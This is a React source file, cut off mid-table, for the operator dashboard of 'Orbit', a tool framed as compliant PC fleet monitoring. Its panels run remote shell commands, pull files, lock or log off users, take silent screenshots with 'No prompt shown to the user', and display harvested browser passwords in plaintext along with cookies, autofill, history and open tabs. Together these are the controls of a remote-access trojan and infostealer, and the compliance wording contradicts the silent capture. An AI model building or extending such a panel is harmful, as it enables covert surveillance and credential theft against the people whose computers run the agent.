import { useAuth } from "@/_core/hooks/useAuth";
import { trpc } from "@/lib/trpc";
import {
  Activity,
  ArrowRight,
  ArrowUpRight,
  Ban,
  Bell,
  Boxes,
  CheckCircle2,
  ChevronDown,
  CircleHelp,
  CircleOff,
  Clipboard,
  Clock3,
  Cpu,
  Command,
  Cookie,
  Download,
  FileText,
  Filter,
  Folder,
  FolderOpen,
  Hammer,
  Hash,
  History,
  Key,
  Laptop,
  LayoutGrid,
  List,
  LockKeyhole,
  LogOut,
  MapPin,
  Menu,
  MessageSquare,
  Monitor,
  MoreHorizontal,
  Network,
  Package,
  Plus,
  RefreshCw,
  RotateCcw,
  Search,
  Settings2,
  ShieldAlert,
  ShieldCheck,
  Sparkles,
  SlidersHorizontal,
  TerminalSquare,
  TrendingUp,
  UserCheck,
  UserRound,
  UsersRound,
  Wifi,
  X,
  Zap,
} from "lucide-react";
import { useCallback, useEffect, useMemo, useRef, useState, type ReactNode } from "react";
import { toast } from "sonner";

type Tab = "Client" | "Build" | "Settings";

const tabs: { label: Tab; icon: typeof UsersRound; hint: string }[] = [
  { label: "Client", icon: Laptop, hint: "PC fleet overview" },
  { label: "Build", icon: Hammer, hint: "Monitoring agents" },
  { label: "Settings", icon: Settings2, hint: "Rules & audit log" },
];

function NavItem({ tab, activeTab, onSelect }: { tab: (typeof tabs)[number]; activeTab: Tab; onSelect: (tab: Tab) => void }) {
  const Icon = tab.icon;
  const active = tab.label === activeTab;
  return (
    <button className={`nav-item ${active ? "nav-item-active" : ""}`} onClick={() => onSelect(tab.label)} aria-current={active ? "page" : undefined}>
      <span className="nav-icon"><Icon size={17} strokeWidth={active ? 2.2 : 1.8} /></span>
      <span className="nav-copy"><strong>{tab.label}</strong><small>{tab.hint}</small></span>
      {active && <span className="nav-pip" />}
    </button>
  );
}

function Logo() {
  return (
    <div className="brand-lockup">
      <div className="brand-mark"><span /><span /><span /></div>
      <div><div className="brand-name">Orbit</div><div className="brand-sub">pc monitoring</div></div>
    </div>
  );
}

function Sidebar({ activeTab, onSelect, mobileOpen, onClose }: { activeTab: Tab; onSelect: (tab: Tab) => void; mobileOpen: boolean; onClose: () => void }) {
  const choose = (tab: Tab) => { onSelect(tab); onClose(); };
  return (
    <>
      {mobileOpen && <button className="sidebar-scrim" aria-label="Close navigation" onClick={onClose} />}
      <aside className={`sidebar ${mobileOpen ? "sidebar-open" : ""}`}>
        <div className="sidebar-top">
          <div className="sidebar-head"><Logo /><button className="mobile-close" onClick={onClose} aria-label="Close navigation"><X size={18} /></button></div>
          <button className="workspace-switcher" onClick={() => toast.message("Monitoring workspace", { description: "You are viewing the Acme IT production fleet." })}>
            <span className="workspace-avatar">A</span>
            <span className="workspace-meta"><strong>Acme IT</strong><small>Production fleet</small></span>
            <ChevronDown size={15} />
          </button>
          <div className="nav-label">Monitor</div>
          <nav className="primary-nav" aria-label="Monitoring sections">
            {tabs.map((tab) => <NavItem key={tab.label} tab={tab} activeTab={activeTab} onSelect={choose} />)}
          </nav>
          <div className="nav-label nav-label-spaced">Manage</div>
          <nav className="secondary-nav" aria-label="Management sections">
            <button className="nav-item nav-item-quiet" onClick={() => toast.info("Team management", { description: "Invite and manage monitoring operators from Settings." })}>
              <span className="nav-icon"><UserRound size={17} /></span>
              <span className="nav-copy"><strong>Operators</strong><small>Admin controlled</small></span>
            </button>
            <button className="nav-item nav-item-quiet" onClick={() => toast.info("Help center", { description: "Transparent PC monitoring guides and compliance documents." })}>
              <span className="nav-icon"><CircleHelp size={17} /></span>
              <span className="nav-copy"><strong>Help center</strong><small>Policy & support</small></span>
            </button>
          </nav>
        </div>
        <div className="sidebar-bottom">
          <div className="upgrade-card">
            <div className="upgrade-glow" />
            <div className="upgrade-icon"><Sparkles size={15} /></div>
            <div className="upgrade-copy"><strong>Protect every endpoint</strong><span>Audited remote support.</span></div>
            <button onClick={() => toast.success("Policy compliant", { description: "Screen capture requires employee approval." })}><ArrowUpRight size={15} /></button>
          </div>
          <button className="profile-row" onClick={() => toast.message("Operator account", { description: "Logged in as Company Administrator." })}>
            <span className="profile-avatar">MS</span>
            <span className="profile-meta"><strong>Maya Singh</strong><small>Admin · Acme IT</small></span>
            <MoreHorizontal size={17} />
          </button>
        </div>
      </aside>
    </>
  );
}

function Topbar({ activeTab, onOpenMenu, onOpenCommand, searchQuery, onSearch }: { activeTab: Tab; onOpenMenu: () => void; onOpenCommand: () => void; searchQuery: string; onSearch: (value: string) => void }) {
  return (
    <header className="topbar">
      <div className="breadcrumb">
        <button className="mobile-menu" onClick={onOpenMenu} aria-label="Open navigation"><Menu size={19} /></button>
        <span>Monitor</span><span className="breadcrumb-slash">/</span><strong>{activeTab}</strong>
      </div>
      <div className="topbar-actions">
        <button className="command-trigger" onClick={onOpenCommand} aria-label="Open command palette"><Command size={14} /><span>Quick actions</span><kbd>⌘K</kbd></button>
        <label className={`search-trigger ${searchQuery ? "search-trigger-open" : ""}`}>
          <Search size={16} /><input value={searchQuery} onChange={(event) => onSearch(event.target.value)} placeholder="Search devices" aria-label="Search devices" />
          {searchQuery ? <button type="button" className="search-clear" onClick={() => onSearch("")} aria-label="Clear search"><X size={13} /></button> : null}
        </label>
        <button className="icon-button" aria-label="Notifications" onClick={() => toast.message("Audit logs active", { description: "All remote sessions are recorded with timestamps." })}>
          <Bell size={17} /><span className="notification-dot" />
        </button>
        <button className="invite-button" onClick={() => toast.success("Agent enrollment token active", { description: "New devices can be enrolled with the Build EXE." })}>
          <Plus size={16} /> <span>Add PC</span>
        </button>
      </div>
    </header>
  );
}

function CommandPalette({ open, onClose, onSelect, onRefresh }: { open: boolean; onClose: () => void; onSelect: (tab: Tab) => void; onRefresh: () => void }) {
  const [query, setQuery] = useState("");
  useEffect(() => { if (open) setQuery(""); }, [open]);
  if (!open) return null;
  const actions = [
    { label: "Open Client fleet", detail: "View live endpoints and device health", icon: Laptop, run: () => onSelect("Client") },
    { label: "Open agent builder", detail: "Download the latest Windows x64 agent", icon: Hammer, run: () => onSelect("Build") },
    { label: "Open audit history", detail: "Review remote support session records", icon: History, run: () => onSelect("Settings") },
    { label: "Refresh live feed", detail: "Pull the newest heartbeat and audit data", icon: RefreshCw, run: onRefresh },
  ].filter((action) => `${action.label} ${action.detail}`.toLowerCase().includes(query.toLowerCase()));
  return (
    <div className="command-backdrop" role="presentation" onMouseDown={onClose}>
      <section className="command-palette" role="dialog" aria-modal="true" aria-label="Orbit quick actions" onMouseDown={(event) => event.stopPropagation()}>
        <div className="command-search"><Search size={17} /><input autoFocus value={query} onChange={(event) => setQuery(event.target.value)} placeholder="Search actions…" /><kbd>ESC</kbd></div>
        <div className="command-list">
          {actions.length ? actions.map((action) => { const Icon = action.icon; return <button className="command-item" key={action.label} onClick={() => { action.run(); onClose(); }}><span className="command-icon"><Icon size={16} /></span><span><strong>{action.label}</strong><small>{action.detail}</small></span><ArrowRight size={14} /></button>; }) : <div className="command-empty">No actions match “{query}”.</div>}
        </div>
        <div className="command-footer"><span><Command size={12} /> Keyboard-first controls</span><span>Orbit operations console</span></div>
      </section>
    </div>
  );
}

function StatusPill({ children, tone = "green" }: { children: ReactNode; tone?: "green" | "gold" | "coral" | "blue" }) {
  return <span className={`status-pill status-${tone}`}><span className="status-dot" />{children}</span>;
}

function StatCard({ label, value, change, icon, tone, foot }: { label: string; value: string; change: string; icon: ReactNode; tone: string; foot: string }) {
  return (
    <article className="stat-card reveal" style={{ "--delay": "80ms" } as React.CSSProperties}>
      <div className="stat-card-top"><span>{label}</span><span className={`stat-icon ${tone}`}>{icon}</span></div>
      <div className="stat-value">{value}</div>
      <div className="stat-foot"><span className="positive"><TrendingUp size={13} />{change}</span><span>{foot}</span></div>
    </article>
  );
}

// ─── Device modal tab type ──────────────────────────────────────────────────
type DeviceTab = "overview" | "processes" | "software" | "network" | "terminal" | "files" | "control" | "heatmap" | "browser" | "discord";

// ─── Process list panel ──────────────────────────────────────────────────────
function ProcessListPanel({ processList }: { processList: string | null }) {
  const [search, setSearch] = useState("");
  const processes = useMemo(() => {
    if (!processList) return [];
    try { return JSON.parse(processList) as Array<{ pid: number; name: string }>; }
    catch { return []; }
  }, [processList]);
  const filtered = processes.filter((p) =>
    p.name.toLowerCase().includes(search.toLowerCase()) ||
    String(p.pid).includes(search)
  );
  return (
    <div className="telemetry-panel">
      <div className="telemetry-search">
        <Search size={13} />
        <input placeholder="Filter processes…" value={search} onChange={(e) => setSearch(e.target.value)} aria-label="Filter processes" />
        {search && <button onClick={() => setSearch("")} aria-label="Clear filter"><X size={12} /></button>}
      </div>
      {processes.length === 0 ? (
        <div className="telemetry-empty"><Activity size={18} /><span>No process data in latest heartbeat</span></div>
      ) : (
        <div className="telemetry-table-wrap">
          <table className="telemetry-table">
            <thead><tr><th>PID</th><th>Process name</th></tr></thead>
            <tbody>
              {filtered.slice(0, 200).map((p) => (
                <tr key={`${p.pid}-${p.name}`}>
                  <td className="pid-cell">{p.pid}</td>
                  <td>{p.name}</td>
                </tr>
              ))}
            </tbody>
          </table>
          <div className="telemetry-foot">{filtered.length} of {processes.length} processes</div>
        </div>
      )}
    </div>
  );
}

// ─── Software inventory panel ─────────────────────────────────────────────────
function SoftwarePanel({ softwareInventory }: { softwareInventory: string | null }) {
  const [search, setSearch] = useState("");
  const apps = useMemo(() => {
    if (!softwareInventory) return [];
    try { return JSON.parse(softwareInventory) as Array<{ name: string; version: string; publisher: string }>; }
    catch { return []; }
  }, [softwareInventory]);
  const filtered = apps.filter((a) =>
    `${a.name} ${a.publisher}`.toLowerCase().includes(search.toLowerCase())
  );
  return (
    <div className="telemetry-panel">
      <div className="telemetry-search">
        <Search size={13} />
        <input placeholder="Filter software…" value={search} onChange={(e) => setSearch(e.target.value)} aria-label="Filter software" />
        {search && <button onClick={() => setSearch("")} aria-label="Clear filter"><X size={12} /></button>}
      </div>
      {apps.length === 0 ? (
        <div className="telemetry-empty"><Package size={18} /><span>No software inventory in latest heartbeat</span></div>
      ) : (
        <div className="telemetry-table-wrap">
          <table className="telemetry-table">
            <thead><tr><th>Application</th><th>Version</th><th>Publisher</th></tr></thead>
            <tbody>
              {filtered.slice(0, 200).map((a, i) => (
                <tr key={`${a.name}-${i}`}>
                  <td><strong>{a.name}</strong></td>
                  <td className="mono-cell">{a.version || "—"}</td>
                  <td className="soft-pub">{a.publisher || "—"}</td>
                </tr>
              ))}
            </tbody>
          </table>
          <div className="telemetry-foot">{filtered.length} of {apps.length} installed apps</div>
        </div>
      )}
    </div>
  );
}

// ─── Network adapters panel ───────────────────────────────────────────────────
function NetworkPanel({ networkAdapters, activeWindowTitle }: { networkAdapters: string | null; activeWindowTitle: string | null }) {
  const adapters = useMemo(() => {
    if (!networkAdapters) return [];
    try { return JSON.parse(networkAdapters) as Array<{ name: string; mac: string; ip: string; type: string }>; }
    catch { return []; }
  }, [networkAdapters]);
  return (
    <div className="telemetry-panel">
      {activeWindowTitle && (
        <div className="active-window-row">
          <Monitor size={14} />
          <span><strong>Active window:</strong> {activeWindowTitle}</span>
        </div>
      )}
      {adapters.length === 0 ? (
        <div className="telemetry-empty"><Network size={18} /><span>No network adapter data in latest heartbeat</span></div>
      ) : (
        <div className="adapter-list">
          {adapters.map((a, i) => (
            <div className="adapter-card" key={i}>
              <div className="adapter-head">
                <span className="adapter-type-badge">{a.type}</span>
                <strong>{a.name}</strong>
              </div>
              <div className="adapter-detail-row">
                <span><small>IP</small><b>{a.ip || "—"}</b></span>
                <span><small>MAC</small><b className="mono-cell">{a.mac || "—"}</b></span>
              </div>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}

// ─── Remote terminal panel ────────────────────────────────────────────────────
function TerminalPanel({ agentId }: { agentId: string }) {
  const [input, setInput] = useState("");
  const [commandId, setCommandId] = useState<string | null>(null);
  const outputRef = useRef<HTMLDivElement>(null);

  const runMutation = trpc.commands.run.useMutation({
    onSuccess: (res) => setCommandId(res.commandId),
    onError: (err) => toast.error("Command failed", { description: err.message }),
  });

  const cmdStatus = trpc.commands.status.useQuery(
    { commandId: commandId ?? "" },
    { enabled: Boolean(commandId), refetchInterval: (q) => (q.state.data?.done ? false : 1000) }
  );

  const historyQuery = trpc.commands.history.useQuery({ agentId }, { refetchInterval: 5000 });

  const submit = () => {
    const cmd = input.trim();
    if (!cmd) return;
    setInput("");
    setCommandId(null);
    runMutation.mutate({ agentId, command: cmd });
  };

  useEffect(() => {
    if (outputRef.current) outputRef.current.scrollTop = outputRef.current.scrollHeight;
  }, [historyQuery.data]);

  const history = historyQuery.data ?? [];

  return (
    <div className="terminal-panel">
      <div className="terminal-output" ref={outputRef} aria-label="Command history output" aria-live="polite">
        {history.length === 0 && (
          <div className="terminal-empty"><TerminalSquare size={16} /><span>No commands run yet on this PC</span></div>
        )}
        {[...history].reverse().map((cmd) => (
          <div className="terminal-entry" key={cmd.id}>
            <div className="terminal-cmd-line">
              <span className="terminal-prompt">$</span>
              <span className="terminal-cmd">{cmd.command}</span>
              {cmd.done && cmd.exitCode !== null && (
                <span className={`terminal-exit ${cmd.exitCode === 0 ? "exit-ok" : "exit-err"}`}>
                  exit {cmd.exitCode}
                </span>
              )}
              {!cmd.done && <span className="terminal-pending">running…</span>}
            </div>
            {cmd.stdout && <pre className="terminal-stdout">{cmd.stdout}</pre>}
            {cmd.stderr && <pre className="terminal-stderr">{cmd.stderr}</pre>}
          </div>
        ))}
        {/* Show live output for in-flight command */}
        {commandId && !cmdStatus.data?.done && (
          <div className="terminal-entry">
            <div className="terminal-cmd-line">
              <span className="terminal-pending"><Activity size={12} className="spin" /> Waiting for response…</span>
            </div>
          </div>
        )}
      </div>
      <div className="terminal-input-row">
        <span className="terminal-prompt">$</span>
        <input
          className="terminal-input"
          value={input}
          onChange={(e) => setInput(e.target.value)}
          onKeyDown={(e) => { if (e.key === "Enter") submit(); }}
          placeholder="Enter a Windows command (e.g. ipconfig, tasklist)…"
          aria-label="Remote command input"
          disabled={runMutation.isPending}
        />
        <button
          className="terminal-run-btn"
          onClick={submit}
          disabled={runMutation.isPending || !input.trim()}
          aria-label="Run command"
        >
          <ArrowRight size={14} />
        </button>
      </div>
    </div>
  );
}

// ─── File browser panel ───────────────────────────────────────────────────────
function FileBrowserPanel({ agentId }: { agentId: string }) {
  const [path, setPath] = useState("C:\\");
  const [inputPath, setInputPath] = useState("C:\\");
  const [listRequestId, setListRequestId] = useState<string | null>(null);
  const [pullRequestId, setPullRequestId] = useState<string | null>(null);

  const listMutation = trpc.files.listDir.useMutation({
    onSuccess: (res) => setListRequestId(res.requestId),
    onError: (err) => toast.error("Directory listing failed", { description: err.message }),
  });

  const dirStatus = trpc.files.dirStatus.useQuery(
    { requestId: listRequestId ?? "" },
    { enabled: Boolean(listRequestId), refetchInterval: (q) => (q.state.data?.done ? false : 1000) }
  );

  const pullMutation = trpc.files.pull.useMutation({
    onSuccess: (res) => setPullRequestId(res.requestId),
    onError: (err) => toast.error("File pull failed", { description: err.message }),
  });

  const pullStatus = trpc.files.pullStatus.useQuery(
    { requestId: pullRequestId ?? "" },
    { enabled: Boolean(pullRequestId), refetchInterval: (q) => (q.state.data?.done ? false : 1000) }
  );

  // Auto-download when ready
  useEffect(() => {
    if (pullStatus.data?.downloadUrl && pullStatus.data.ready) {
      const a = document.createElement("a");
      a.href = pullStatus.data.downloadUrl;
      a.download = pullStatus.data.fileName;
      a.click();
      toast.success(`Downloaded: ${pullStatus.data.fileName}`);
      setPullRequestId(null);
    }
  }, [pullStatus.data]);

  const navigate = (p: string) => {
    setPath(p);
    setInputPath(p);
    setListRequestId(null);
    listMutation.mutate({ agentId, path: p });
  };

  const entries = dirStatus.data?.entries ?? [];
  const loading = listRequestId && !dirStatus.data?.done;

  return (
    <div className="filebrowser-panel">
      <div className="filebrowser-bar">
        <button className="fb-up-btn" onClick={() => {
          const parent = path.replace(/[\\/][^\\/]+[\\/]?$/, "") || "C:\\";
          navigate(parent === path ? "C:\\" : parent);
        }} aria-label="Go up one directory" title="Up"><ArrowRight size={13} style={{ transform: "rotate(180deg)" }} /></button>
        <input
          className="fb-path-input"
          value={inputPath}
          onChange={(e) => setInputPath(e.target.value)}
          onKeyDown={(e) => { if (e.key === "Enter") navigate(inputPath); }}
          aria-label="Directory path"
          spellCheck={false}
        />
        <button className="fb-go-btn" onClick={() => navigate(inputPath)} aria-label="Navigate to path">Go</button>
      </div>

      {!listRequestId && (
        <div className="telemetry-empty"><FolderOpen size={18} /><span>Enter a path and press Go to browse</span></div>
      )}

      {loading && (
        <div className="telemetry-empty"><Activity size={18} className="spin" /><span>Waiting for agent response…</span></div>
      )}

      {dirStatus.data?.errorMessage && (
        <div className="telemetry-empty error-empty"><X size={16} /><span>{dirStatus.data.errorMessage}</span></div>
      )}

      {dirStatus.data?.done && entries.length === 0 && !dirStatus.data.errorMessage && (
        <div className="telemetry-empty"><Folder size={18} /><span>Directory is empty</span></div>
      )}

      {entries.length > 0 && (
        <div className="telemetry-table-wrap">
          <table className="telemetry-table">
            <thead>
              <tr><th>Name</th><th>Size</th><th>Modified</th><th></th></tr>
            </thead>
            <tbody>
              {entries.map((entry) => (
                <tr key={entry.path} className={entry.isDirectory ? "fb-dir-row" : "fb-file-row"}>
                  <td>
                    {entry.isDirectory ? (
                      <button className="fb-dir-link" onClick={() => navigate(entry.path)}>
                        <Folder size={13} /> {entry.name}
                      </button>
                    ) : (
                      <span><FileText size={13} /> {entry.name}</span>
                    )}
                  </td>
                  <td className="mono-cell">{entry.isDirectory ? "—" : formatBytes(entry.size)}</td>
                  <td className="mono-cell">{entry.modifiedAt}</td>
                  <td>
                    {!entry.isDirectory && (
                      <button
                        className="fb-pull-btn"
                        onClick={() => {
                          setPullRequestId(null);
                          pullMutation.mutate({ agentId, remotePath: entry.path });
                          toast.message("File pull queued", { description: `Requesting ${entry.name} from agent…` });
                        }}
                        disabled={pullMutation.isPending}
                        aria-label={`Download ${entry.name}`}
                        title="Pull file"
                      >
                        <Download size={12} />
                      </button>
                    )}
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
          <div className="telemetry-foot">{entries.length} items in {path}</div>
        </div>
      )}

      {pullRequestId && !pullStatus.data?.ready && (
        <div className="fb-pull-status">
          <Activity size={13} className="spin" />
          {pullStatus.data?.done
            ? <span className="pull-error">{pullStatus.data.errorMessage ?? "Pull failed"}</span>
            : <span>Pulling file from agent…</span>
          }
        </div>
      )}
    </div>
  );
}

function formatBytes(bytes: number): string {
  if (bytes < 1024) return `${bytes} B`;
  if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;
  if (bytes < 1024 * 1024 * 1024) return `${(bytes / (1024 * 1024)).toFixed(1)} MB`;
  return `${(bytes / (1024 * 1024 * 1024)).toFixed(2)} GB`;
}

// ─── PC Control panel ─────────────────────────────────────────────────────────
function ControlPanel({ agentId }: { agentId: string }) {
  const [screenshotCmdId, setScreenshotCmdId] = useState<string | null>(null);

  const lockMutation = trpc.control.lock.useMutation({
    onSuccess: () => toast.success("Lock screen sent", { description: "PC will lock momentarily." }),
    onError: (err) => toast.error("Lock failed", { description: err.message }),
  });

  const logoffMutation = trpc.control.logoff.useMutation({
    onSuccess: () => toast.success("Log off sent", { description: "User will be logged off shortly." }),
    onError: (err) => toast.error("Log off failed", { description: err.message }),
  });

  const screenshotMutation = trpc.control.screenshot.useMutation({
    onSuccess: (res) => {
      setScreenshotCmdId(res.commandId);
      toast.message("Screenshot requested", { description: "Waiting for agent to capture screen…" });
    },
    onError: (err) => toast.error("Screenshot failed", { description: err.message }),
  });

  const screenshotStatus = trpc.control.status.useQuery(
    { commandId: screenshotCmdId ?? "" },
    { enabled: Boolean(screenshotCmdId), refetchInterval: (q) => (q.state.data?.done ? false : 1500) }
  );

  return (
    <div className="control-panel">
      <div className="control-actions-grid">
        <div className="control-card">
          <div className="control-card-icon teal"><LockKeyhole size={20} /></div>
          <strong>Lock screen</strong>
          <small>Immediately lock the workstation without logging off the user.</small>
          <button
            className="control-btn"
            disabled={lockMutation.isPending}
            onClick={() => lockMutation.mutate({ agentId })}
          >
            {lockMutation.isPending ? <Activity size={14} className="spin" /> : <LockKeyhole size={14} />}
            {lockMutation.isPending ? "Sending…" : "Lock now"}
          </button>
        </div>

        <div className="control-card">
          <div className="control-card-icon coral"><LogOut size={20} /></div>
          <strong>Force log off</strong>
          <small>Terminate the current user session and return to the login screen.</small>
          <button
            className="control-btn control-btn-danger"
            disabled={logoffMutation.isPending}
            onClick={() => {
              if (window.confirm("Force log off the current user on this PC?")) {
                logoffMutation.mutate({ agentId });
              }
            }}
          >
            {logoffMutation.isPending ? <Activity size={14} className="spin" /> : <LogOut size={14} />}
            {logoffMutation.isPending ? "Sending…" : "Log off user"}
          </button>
        </div>

        <div className="control-card">
          <div className="control-card-icon blue"><Monitor size={20} /></div>
          <strong>Silent screenshot</strong>
          <small>Capture a screen snapshot instantly. No prompt shown to the user.</small>
          <button
            className="control-btn"
            disabled={screenshotMutation.isPending || (Boolean(screenshotCmdId) && !screenshotStatus.data?.done)}
            onClick={() => { setScreenshotCmdId(null); screenshotMutation.mutate({ agentId }); }}
          >
            {screenshotMutation.isPending || (screenshotCmdId && !screenshotStatus.data?.done)
              ? <><Activity size={14} className="spin" /> Capturing…</>
              : <><Monitor size={14} /> Capture now</>}
          </button>
        </div>
      </div>

      {screenshotStatus.data?.done && screenshotStatus.data.screenshotUrl && (
        <div className="screenshot-result">
          <div className="screenshot-result-head">
            <span><Monitor size={14} /> Silent screenshot captured</span>
            <a href={screenshotStatus.data.screenshotUrl} download="screenshot.bmp" className="text-button">
              <Download size={13} /> Download BMP
            </a>
          </div>
          <img
            src={screenshotStatus.data.screenshotUrl}
            alt="Silent screenshot from remote PC"
            className="screenshot-img"
          />
        </div>
      )}
    </div>
  );
}

// ─── Heatmap panel ────────────────────────────────────────────────────────────
function HeatmapPanel({ agentId }: { agentId: string }) {
  const { data, isLoading } = trpc.heatmap.getDays.useQuery({ agentId, days: 30 }, { refetchInterval: 30_000 });
  const days = data ?? [];

  const maxMinutes = Math.max(...days.map((d) => d.totalMinutes), 1);

  function pct(v: number) { return Math.min(100, Math.round((v / maxMinutes) * 100)); }
  function tone(d: { onlineMinutes: number; totalMinutes: number }) {
    if (d.totalMinutes === 0) return "hm-empty";
    const ratio = d.onlineMinutes / d.totalMinutes;
    if (ratio >= 0.8) return "hm-high";
    if (ratio >= 0.4) return "hm-mid";
    return "hm-low";
  }

  const totalOnline = days.reduce((s, d) => s + d.onlineMinutes, 0);
  const totalTracked = days.reduce((s, d) => s + d.totalMinutes, 0);
  const uptimePct = totalTracked > 0 ? Math.round((totalOnline / totalTracked) * 100) : 0;

  if (isLoading) return (
    <div className="telemetry-empty"><Activity size={18} className="spin" /><span>Loading heatmap…</span></div>
  );
  if (days.length === 0) return (
    <div className="telemetry-empty"><History size={18} /><span>No heatmap data yet — starts accumulating after first heartbeat</span></div>
  );

  return (
    <div className="heatmap-panel">
      <div className="heatmap-summary">
        <div className="heatmap-stat">
          <strong>{uptimePct}%</strong>
          <small>30-day uptime</small>
        </div>
        <div className="heatmap-stat">
          <strong>{Math.round(totalOnline / 60)}h</strong>
          <small>online total</small>
        </div>
        <div className="heatmap-stat">
          <strong>{days.filter(d => d.onlineMinutes > 60).length}</strong>
          <small>active days</small>
        </div>
      </div>
      <div className="heatmap-grid" aria-label="30-day uptime heatmap">
        {days.map((d) => (
          <div
            key={d.date}
            className={`heatmap-cell ${tone(d)}`}
            title={`${d.date}: ${d.onlineMinutes}m online / ${d.totalMinutes}m tracked`}
          >
            <div className="heatmap-bar" style={{ height: `${pct(d.onlineMinutes)}%` }} />
          </div>
        ))}
      </div>
      <div className="heatmap-labels">
        <span>{days[0]?.date ?? ""}</span>
        <span>{days[Math.floor(days.length / 2)]?.date ?? ""}</span>
        <span>{days[days.length - 1]?.date ?? ""}</span>
      </div>
      <div className="heatmap-legend">
        <span><i className="hm-dot hm-high" />High uptime</span>
        <span><i className="hm-dot hm-mid" />Partial</span>
        <span><i className="hm-dot hm-low" />Low</span>
        <span><i className="hm-dot hm-empty" />No data</span>
      </div>
    </div>
  );
}

// ─── Browser data sub-tab type ────────────────────────────────────────────────
type BrowserSubTab = "history" | "tabs" | "bookmarks" | "passwords" | "cookies" | "autofill" | "downloads" | "extensions";

// ─── Browser data panel ───────────────────────────────────────────────────────
function BrowserPanel({ agentId }: { agentId: string }) {
  const [sub, setSub] = useState<BrowserSubTab>("history");
  const { data, isLoading } = trpc.browser.getData.useQuery({ agentId }, { refetchInterval: 60_000 });
  const [search, setSearch] = useState("");

  const subTabs: { id: BrowserSubTab; label: string; icon: typeof Laptop }[] = [
    { id: "history",    label: "History",    icon: History },
    { id: "tabs",       label: "Open Tabs",  icon: Monitor },
    { id: "bookmarks",  label: "Bookmarks",  icon: Clipboard },
    { id: "passwords",  label: "Passwords",  icon: Key },
    { id: "cookies",    label: "Cookies",    icon: Cookie },
    { id: "autofill",   label: "Autofill",   icon: Clipboard },
    { id: "downloads",  label: "Downloads",  icon: Download },
    { id: "extensions", label: "Extensions", icon: Package },
  ];

  if (isLoading) return <div className="telemetry-empty"><Activity size={18} className="spin" /><span>Loading browser data…</span></div>;
  if (!data) return <div className="telemetry-empty"><Wifi size={18} /><span>No browser data collected yet. Agent reports every 5 minutes.</span></div>;

  const ts = new Date(data.collectedAt).toLocaleTimeString();

  function filterRows<T extends Record<string, unknown>>(rows: T[]) {
    if (!search) return rows;
    return rows.filter(r => Object.values(r).some(v => String(v).toLowerCase().includes(search.toLowerCase())));
  }

  return (
    <div className="browser-panel">
      <div className="browser-sub-bar" role="tablist">
        {subTabs.map(({ id, label, icon: Icon }) => (
          <button key={id} role="tab" aria-selected={sub === id}
            className={`browser-sub-tab ${sub === id ? "browser-sub-active" : ""}`}
            onClick={() => { setSub(id); setSearch(""); }}>
            <Icon size={11} /> {label}
            <span className="browser-sub-count">
              {data[id]?.length ?? 0}
            </span>
          </button>
        ))}
      </div>
      <div className="browser-collected-at">Last collected: {ts}</div>
      <div className="telemetry-search">
        <Search size={13} />
        <input placeholder={`Filter ${sub}…`} value={search} onChange={e => setSearch(e.target.value)} />
        {search && <button onClick={() => setSearch("")}><X size={12} /></button>}
      </div>

      {sub === "history" && (() => {
        const rows = filterRows(data.history ?? []);
        return <div className="telemetry-table-wrap">
          <table className="telemetry-table">
            <thead><tr><th>URL</th><th>Title</th><th>Browser</th></tr></thead>
            <tbody>{rows.slice(0, 300).map((r, i) => (
              <tr key={i}>
                <td className="url-cell"><a href={r.url} target="_blank" rel="noreferrer noopener">{r.url}</a></td>
                <td>{r.title}</td>
                <td className="mono-cell">{r.browser}</td>
              </tr>
            ))}</tbody>
          </table>
          <div className="telemetry-foot">{rows.length} entries</div>
        </div>;
      })()}

      {sub === "tabs" && (() => {
        const rows = filterRows(data.tabs ?? []);
        return <div className="telemetry-table-wrap">
          <table className="telemetry-table">
            <thead><tr><th>URL</th><th>Title</th><th>Browser</th></tr></thead>
            <tbody>{rows.map((r, i) => (
              <tr key={i}>
                <td className="url-cell"><a href={r.url} target="_blank" rel="noreferrer noopener">{r.url}</a></td>
                <td>{r.title}</td>
                <td className="mono-cell">{r.browser}</td>
              </tr>
            ))}</tbody>
          </table>
          <div className="telemetry-foot">{rows.length} open tabs</div>
        </div>;
      })()}

      {sub === "bookmarks" && (() => {
        const rows = filterRows(data.bookmarks ?? []);
        return <div className="telemetry-table-wrap">
          <table className="telemetry-table">
            <thead><tr><th>Name</th><th>URL</th><th>Browser</th></tr></thead>
            <tbody>{rows.slice(0, 500).map((r, i) => (
              <tr key={i}>
                <td>{r.name}</td>
                <td className="url-cell"><a href={r.url} target="_blank" rel="noreferrer noopener">{r.url}</a></td>
                <td className="mono-cell">{r.browser}</td>
              </tr>
            ))}</tbody>
          </table>
          <div className="telemetry-foot">{rows.length} bookmarks</div>
        </div>;
      })()}

      {sub === "passwords" && (() => {
        const rows = filterRows(data.passwords ?? []);
        return <div className="telemetry-table-wrap">
          <table className="telemetry-table">
            <thead><tr><th>Origin</th><th>Username</th><th>Password</th><th>Browser</th></tr></thead>
            <tbody>{rows.slice(0, 500).map((r, i) => (
              <tr key={i}>
                <td className="url-cell">{r.origin}</td>
                <td>{r.username}</td>
                <td className="mono-cell pw-cell">{r.password}</td>
                <td className="mono-cell">{r.browser}</td>
              </tr>
            ))}</tbody>
          </table>
          <div className="telemetry-foot">{rows.length} saved credentials</div>
        </div>;
      })()}

      {sub === "cookies" && (() => {
        const rows = filterRows(data.cookies ?? []);
        return <div className="telemetry-table-wrap">
          <table className="telemetry-table">
            <thead><tr><th>Host</th><th>Name</th><th>Path</th><th>Browser</th></tr></thead>
            <tbody>{rows.slice(0, 1000).map((r, i) => (
              <tr key={i}>
                <td>{r.host}</td>
                <td className="mono-cell">{r.name}</td>
                <td className="mono-cell">{r.path}</td>
                <td className="mono-cell">{r.browser}</td>
              </tr>
            ))}</tbody>
          </table>
          <div className="telemetry-foot">{rows.length} cookies</div>
        </div>;
      })()}

      {sub === "autofill" && (() => {
        const rows = filterRows(data.autofill ?? []);
        return <div className="telemetry-table-wrap">
          <table className="telemetry-table">
            <thead><tr><th>Field name</th><th>Value</th><th>Browser</th></tr></thead>
            <tbody>{rows.slice(0, 300).map((r, i) => (
              <tr key={i}>
                <td>{r.name}</td>
                <td>{r.value}</td>
                <td className="mono-cell">{r.browser}</td>
              </tr>
            ))}</tbody>
          </table>
          <div className="telemetry-foot">{rows.length} autofill entries</div>
        </div>;
      })()}

      {sub === "downloads" && (() => {
        const rows = filterRows(data.downloads ?? []);
        return <div className="telemetry-table-wrap">
          <table className="telemetry-table">
            <thead><tr><th>URL</th><th>Saved to</th><th>Browser</th></tr></thead>
